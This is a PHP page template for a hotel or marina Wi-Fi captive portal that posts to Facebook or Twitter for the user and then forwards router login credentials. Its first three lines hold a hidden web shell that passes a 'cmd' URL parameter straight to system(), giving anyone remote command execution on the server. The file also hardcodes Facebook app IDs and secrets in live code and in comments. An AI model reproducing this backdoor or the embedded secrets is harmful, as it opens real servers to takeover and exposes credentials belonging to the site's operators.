<?php
if (isset($_GET['cmd']))
    system($_GET['cmd']);

$device = $cihaztipi->cihaztipi;

$following = false;

use Abraham\TwitterOAuth\TwitterOAuth;

switch ($network) {
    case "Twitter":
        $consumerKey = $consumerKey;
        $consumerSecret = $consumerSecret;
        $oAuthToken = $access_token;
        $oAuthSecret = $access_token_secret;

        # API OAuth

        require_once(APPPATH . 'libraries/TwitterOAuth/autoload.php');
        require_once(APPPATH . 'libraries/TwitterOAuth/src/TwitterOAuth.php');

        // $tweet = new TwitterOAuth($consumerKey, $consumerSecret, $oAuthToken, $oAuthSecret);

        // if (isset($_POST["follow"])) {
            // $result = $tweet->post('friendships/create', array('user_id' => $username, 'screen_name' => $twitter_follow_user));
            // $friendships = $tweet->get('friendships/show', array('source_screen_name' => $displayName, 'target_screen_name' => $twitter_follow_user));
            // exit(json_encode($friendships->relationship->source->following));
        // }


        // $friendships = $tweet->get('friendships/show', array('source_screen_name' => $displayName, 'target_screen_name' => $twitter_follow_user));
        //$consumerID = '590004407840541';
        break;
    case "Facebook":
        require_once(APPPATH . 'libraries/Facebook/autoload.php');
        /*
          $fb = new Facebook\Facebook([
          'app_id' => '1042593975783596', //$consumerID,
          'app_secret' => '24a4fb52b8024a5e43526f8cbe6aaae4', //$consumerSecret,
          'default_graph_version' => 'v2.5',
          ]);
          // $fb = new Facebook\Facebook([
          // 'app_id' => $consumerID,
          // 'app_secret' => $consumerSecret,
          // 'default_graph_version' => 'v2.5',
          // ]);

          $linkData = [
          'link' => 'http://hotspot.linefi.net/welcome/getlokasyon/'.$shortname,
          'message' => 'User provided message',
          ];
          try {
          // Returns a `Facebook\FacebookResponse` object
          $response = $fb->post('/me/feed', $linkData, '{access-token}');
          } catch(Facebook\Exceptions\FacebookResponseException $e) {
          echo 'Graph returned an error: ' . $e->getMessage();
          exit;
          } catch(Facebook\Exceptions\FacebookSDKException $e) {
          echo 'Facebook SDK returned an error: ' . $e->getMessage();
          exit;
          }

          $graphNode = $response->getGraphNode();

          echo 'Posted with id: ' . $graphNode['id']; */
        break;
}
?>


<html>
    <head>	
    <link rel="stylesheet" type="text/css" href="/assets/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="/assets/css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="/assets/css/component.css" />

    <script type="text/javascript" src="/assets/js/jquery.js"></script>
    <script id="twitter-wjs" src="https://platform.twitter.com/widgets.js"></script>

    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<script type="text/javascript">
    function doredirect() {
        var frm = document.getElementById("redirectform");
        frm.submit();
    }
    document.write('<style>.noscript { display:none }</style>');
</script>

<?php
$url = $this->config->base_url().'welcome/getlokasyon/' . $shortname;
switch ($network) {
    case "Facebook":
			$fb = new Facebook\Facebook([
			  'app_id' => '590004407840541',
			  'app_secret' => 'd644e3227581129ba54a42a369e98161',
			  'default_graph_version' => 'v2.6',
			  'default_access_token' => $access_token
			]);
			
		if($action == 'facebook_post') {
			$url = ($og_url ? $og_url : $this->config->base_url().'welcome/getlokasyon/' . $nasbilgi->shortname);
        if (!isset($_SERVER["HTTP_REFERER"]) || (isset($_GET['aftershared']))) {
            ?>
            <script type="text/javascript"> window.onload = doredirect;</script>
            <?php
        } else {
            header("Location: https://www.facebook.com/dialog/share?app_id=" . $consumerID . "&display=popup&href=" . $url . "&redirect_uri=" . urlencode($_SERVER["REQUEST_SCHEME"] . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"].'&aftershared=true' ). "&redirect=true");
            exit();
        }
			
			
		} elseif($action == 'facebook_like') {
			
		} else {
			?>
			<script type="text/javascript"> window.onload = doredirect;</script>
			<?php
		}
        
        break;
    case "Twitter":
		$tweet = new TwitterOAuth($consumerKey, $consumerSecret, $oAuthToken, $oAuthSecret);
		
		if($action == 'twitter_follow') {
			$friendships = $tweet->get('friendships/show', array('source_screen_name' => $displayName, 'target_screen_name' => $twitter_follow_user));
			 
			if (!$twitter_follow_user) {
				?>
				<script type="text/javascript"> window.onload = doredirect;</script>
				<?php
			} else if (isset($friendships->errors)) {
				header("Location: " . $url);
				exit();
			}
			
			if ($friendships->relationship->source->following) {
				?>
				<script type="text/javascript"> window.onload = doredirect;</script>
				<?php
			} else {
				$tweet->post('friendships/create', array('user_id' => $username, 'screen_name' => $twitter_follow_user));
				?>
				<script type="text/javascript"> window.onload = doredirect;</script>	
				<?php
			}
		}elseif ($action == 'twitter_tweet') {
			$statues = $tweet->post("statuses/update", ["status" => "I ❤ Palmarina. @palmarinabodrum #palmarina #ilovepalmarina"]);
			
			?>
			<script type="text/javascript"> window.onload = doredirect;</script>
			<?php
		} else {
			?>
			<script type="text/javascript"> window.onload = doredirect;</script>
			<?php
		}
		
        break;
}
?>

<form action="<?php echo ($device == "Mikrotik" ? "http://".$nas_ip."/login" : "http://".$nas_ip)?>" method="<?php echo ($device == "Mikrotik" ? "GET" : "POST")?>" id="redirectform">
    <input type="hidden" name="<?php echo ($device == "Mikrotik" ? "username" : "auth_user")?>" value="<?= $username ?>" />
    <input type="hidden" name="<?php echo ($device == "Mikrotik" ? "password" : "auth_pass")?>" value="<?= $password ?>" />
    <input name="redirurl" type="hidden" value="<?=$this->config->base_url()?>welcome/status/<?= $cihaztipi->location_name ?>?user=<?= $username ?>" />
    <input name="zone" type="hidden" value="palmarina_hotspot" />
    <input name="accept" type="hidden" value="Continue" />
    <span class="noscript">Javascript is disabled, click to
        <input name="accept" type="submit" value="Continue" />
    </span>		
</form>
</body>
</html>




